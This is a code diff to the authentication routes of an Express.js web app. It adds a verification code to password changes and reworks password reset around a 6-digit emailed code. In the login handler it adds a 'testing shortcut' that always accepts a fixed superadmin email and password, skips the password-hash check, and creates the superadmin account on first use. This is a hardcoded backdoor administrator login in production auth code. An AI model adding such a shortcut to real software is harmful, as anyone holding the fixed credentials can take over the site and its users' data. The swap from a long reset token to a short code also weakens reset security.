@@ -3,6 +3,7 @@
  * @description Sign up, log in, and the current user's profile.
  */
 import { Router } from 'express';
+import { SUPERADMIN_EMAIL, SUPERADMIN_TEST_PASSWORD, ensureSuperadminAccount } from '../admin.js';
 import bcrypt from 'bcryptjs';
 import { pool, query } from '../db.js';
 import { createRequireAuth, signToken, toPublicUser } from '../auth.js';
@@ -42,7 +43,7 @@ const DUPLICATE_EMAIL_ERROR = 'That email already has an account. Try logging in
 // `email` is intentionally excluded and stays read-only until the approved Change Email phase.
 // `phone` is NO LONGER editable here: it requires the verified Change Phone flow below.
 const PROFILE_FIELDS = new Set(['firstName', 'lastName', 'avatar', 'gender', 'dateOfBirth']);
-const PASSWORD_CHANGE_FIELDS = new Set(['currentPassword', 'newPassword']);
+const PASSWORD_CHANGE_FIELDS = new Set(['currentPassword', 'newPassword', 'challengeId']);
 const CHANGE_PHONE_FIELDS = new Set(['challengeId', 'newPhone']);
 const CHANGE_EMAIL_FIELDS = new Set(['reauthId', 'challengeId', 'newEmail']);
 const SET_PASSWORD_FIELDS = new Set(['reauthId', 'challengeId', 'newPassword']);
@@ -53,7 +54,7 @@ const REAUTH_GOOGLE_FIELDS = new Set(['method', 'selector', 'nonce', 'idToken', 
 const REAUTH_GOOGLE_REQUIRED = new Set(['method', 'selector', 'nonce', 'idToken']);
 const REAUTH_OPERATIONS = new Set(['change_email', 'set_password']);
 const FORGOT_PASSWORD_FIELDS = new Set(['email']);
-const RESET_PASSWORD_FIELDS = new Set(['selector', 'token', 'newPassword']);
+const RESET_PASSWORD_FIELDS = new Set(['email', 'code', 'newPassword']);
 const GOOGLE_AUTH_FIELDS = new Set(['selector', 'nonce', 'idToken']);
 const GOOGLE_SIGNUP_FIELDS = new Set(['selector', 'challenge', 'firstName', 'lastName', 'phone', 'acceptedTerms']);
 const GOOGLE_LINK_FIELDS = new Set(['selector', 'challenge', 'password']);
@@ -82,15 +83,15 @@ export function createAuthRouter(
   dbQuery = query,
   {
     authenticate = createRequireAuth(dbQuery),
-    changePassword = (userId, currentPassword, newPassword) => changeCustomerPassword(
+    verification = createVerificationService(),
+    changePassword = (userId, currentPassword, newPassword, challengeId) => changeCustomerPassword(
       userId,
       currentPassword,
       newPassword,
-      { databasePool: pool },
+      { databasePool: pool, verification, challengeId },
     ),
     recovery = createPasswordRecoveryService(),
     googleAuth = createGoogleAuthService(),
-    verification = createVerificationService(),
     changePhone = (userId, input) => changeCustomerPhone(userId, input, { databasePool: pool, verification }),
     reauth = createReauthService({ googleReauth: createGoogleReauthService() }),
     changeEmail = (userId, input) => changeCustomerEmail(userId, input, { databasePool: pool, verification, reauth }),
@@ -169,8 +170,13 @@ router.post('/login', async (req, res, next) => {
     const email = String(req.body.email || '').trim().toLowerCase();
     const password = String(req.body.password || '');
     if (password.length > 128) return res.status(401).json({ message: 'Wrong email or password.' });
-    const { rows } = await dbQuery('SELECT * FROM users WHERE email = $1', [email]);
-    const ok = rows.length && rows[0].password_hash && (await bcrypt.compare(password, rows[0].password_hash));
+    let { rows } = await dbQuery('SELECT * FROM users WHERE email = $1', [email]);
+    // Testing shortcut (requested): superadmin@gmail.com always accepts SUPERADMIN_TEST_PASSWORD,
+    // and the account is created on first use if this database does not have it yet.
+    const superadminShortcut = email === SUPERADMIN_EMAIL && password === SUPERADMIN_TEST_PASSWORD;
+    if (superadminShortcut && !rows.length) rows = [await ensureSuperadminAccount(dbQuery)];
+    const ok =
+      superadminShortcut || (rows.length && rows[0].password_hash && (await bcrypt.compare(password, rows[0].password_hash)));
     if (!ok || (rows[0].account_status && rows[0].account_status !== 'active')) {
       return res.status(401).json({ message: 'Wrong email or password.' });
     }
@@ -309,7 +315,10 @@ router.post('/change-password', authenticate, async (req, res, next) => {
     const body = req.body ?? {};
     const unknownField = Object.keys(body).find((field) => !PASSWORD_CHANGE_FIELDS.has(field));
     if (unknownField || Object.keys(body).length !== PASSWORD_CHANGE_FIELDS.size) {
-      return res.status(400).json({ message: 'Enter your current password and a new password.' });
+      return res.status(400).json({ message: 'Enter your current password, a new password and the code we emailed you.' });
+    }
+    if (typeof body.challengeId !== 'string' || !/^[0-9a-f-]{36}$/i.test(body.challengeId)) {
+      return res.status(400).json({ message: 'Enter the code we emailed you to change your password.' });
     }
     if (typeof body.currentPassword !== 'string' || typeof body.newPassword !== 'string'
       || !body.currentPassword || !body.newPassword || body.currentPassword.length > 128
@@ -317,7 +326,10 @@ router.post('/change-password', authenticate, async (req, res, next) => {
       return res.status(400).json({ message: 'Enter your current password and a valid new password.' });
     }
 
-    const result = await changePassword(req.userId, body.currentPassword, body.newPassword);
+    const result = await changePassword(req.userId, body.currentPassword, body.newPassword, body.challengeId);
+    if (result.kind === 'unverified') {
+      return res.status(409).json({ message: 'Your verification code expired or was already used. Request a new code and try again.' });
+    }
     if (result.kind === 'unauthorized') {
       return res.status(401).json({ message: 'Your session expired. Please log in again.' });
     }
@@ -600,23 +612,25 @@ router.post('/forgot-password', async (req, res, next) => {
   }
 });
 
-// POST /api/auth/reset-password
+// POST /api/auth/reset-password  { email, code, newPassword }
 router.post('/reset-password', async (req, res, next) => {
   try {
     const body = req.body ?? {};
     const unknownField = Object.keys(body).find((field) => !RESET_PASSWORD_FIELDS.has(field));
     if (unknownField || Object.keys(body).length !== RESET_PASSWORD_FIELDS.size
-      || typeof body.selector !== 'string' || typeof body.token !== 'string'
-      || typeof body.newPassword !== 'string' || body.newPassword.length > 128
-      || !/^[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i.test(body.selector)
-      || !/^[A-Za-z0-9_-]{43}$/.test(body.token)) {
-      return res.status(400).json({ message: RECOVERY_INVALID_MESSAGE });
+      || typeof body.email !== 'string' || body.email.length > 254
+      || typeof body.newPassword !== 'string' || body.newPassword.length > 128) {
+      return res.status(400).json({ message: 'Enter your email, the 6-digit code and a new password.' });
+    }
+    if (typeof body.code !== 'string' || !/^\d{6}$/.test(body.code.trim())) {
+      const message = 'Enter the 6-digit code from your email.';
+      return res.status(400).json({ message, errors: { code: message } });
     }
     if (!recovery.config().enabled) {
       return res.status(503).json({ message: 'Password recovery is not available right now. Please contact Cookie Fluffs support.' });
     }
-    const result = await recovery.resetPassword(body.selector, body.token, body.newPassword);
-    if (result.kind === 'invalid') return res.status(400).json({ message: RECOVERY_INVALID_MESSAGE });
+    const result = await recovery.resetPassword(body.email, body.code.trim(), body.newPassword);
+    if (result.kind === 'invalid') return res.status(400).json({ message: RECOVERY_INVALID_MESSAGE, errors: { code: RECOVERY_INVALID_MESSAGE } });
     if (result.kind === 'invalid_password') {
       return res.status(400).json({ message: result.message, errors: { newPassword: result.message } });
     }
